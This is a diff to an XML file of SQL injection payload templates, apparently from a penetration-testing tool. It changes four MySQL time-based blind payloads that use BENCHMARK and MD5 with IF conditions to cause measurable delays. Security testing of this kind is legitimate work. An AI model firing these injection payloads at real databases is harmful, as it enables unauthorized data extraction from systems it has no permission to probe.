@@ -1461,9 +1461,9 @@ Formats:
         <risk>2</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>; IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM]);</vector>
+        <vector>; IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[RANDSTR]')), [RANDNUM]);</vector>
         <request>
-            <payload>; SELECT BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'));</payload>
+            <payload>; SELECT BENCHMARK([SLEEPTIME]000000, MD5('[RANDSTR]'));</payload>
             <comment>#</comment>
         </request>
         <response>
@@ -1732,9 +1732,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM])</vector>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[RANDSTR]')), [RANDNUM])</vector>
         <request>
-            <payload>AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</payload>
+            <payload>AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000, MD5('[RANDSTR]'))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1751,9 +1751,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM])</vector>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[RANDSTR]')), [RANDNUM])</vector>
         <request>
-            <payload>AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</payload>
+            <payload>AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000, MD5('[RANDSTR]'))</payload>
             <comment>#</comment>
         </request>
         <response>
@@ -2097,9 +2097,9 @@ Formats:
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM])</vector>
+        <vector>OR [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[RANDSTR]')), [RANDNUM])</vector>
         <request>
-            <payload>OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</payload>
+            <payload>OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000, MD5('[RANDSTR]'))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
